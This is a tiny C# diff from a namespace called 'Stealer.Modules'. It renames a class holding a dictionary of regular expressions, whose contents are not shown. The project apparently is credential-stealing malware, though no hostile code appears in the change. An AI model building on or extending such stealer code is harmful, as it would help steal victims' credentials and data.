@@ -3,7 +3,7 @@ using System.Text.RegularExpressions;
 
 namespace Stealer.Modules
 {
-    internal sealed class Patterns
+    internal sealed class RegexPatterns
     {
         public static Dictionary<string, Regex> patterns = new Dictionary<string, Regex>()
         {
